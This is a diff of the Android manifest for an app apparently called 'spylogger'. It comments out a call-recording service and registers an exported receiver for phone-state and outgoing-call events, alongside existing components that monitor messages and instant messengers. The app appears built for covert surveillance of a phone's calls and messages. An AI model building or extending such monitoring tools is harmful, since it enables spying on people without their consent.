@@ -81,12 +81,12 @@
             </intent-filter>
         </receiver>
         <!--recording-->
-        <service
+       <!-- <service
             android:name="com.gravatasufoca.spylogger.services.RecordService"
             android:enabled="true"
             android:exported="true"
             android:label="call service">
-        </service>
+        </service>-->
 
         <service android:name="com.gravatasufoca.spylogger.receivers.InstantMessenger"
             android:label="@string/app_name"
@@ -126,6 +126,18 @@
             android:label="msg received" >
             <intent-filter>
                 <action android:name="MENSAGEM_RECEBIDA" />
+            </intent-filter>
+        </receiver>
+
+
+        <!--boot-->
+        <receiver
+            android:name="com.gravatasufoca.spylogger.receivers.CallReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.PHONE_STATE" />
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
             </intent-filter>
         </receiver>
 
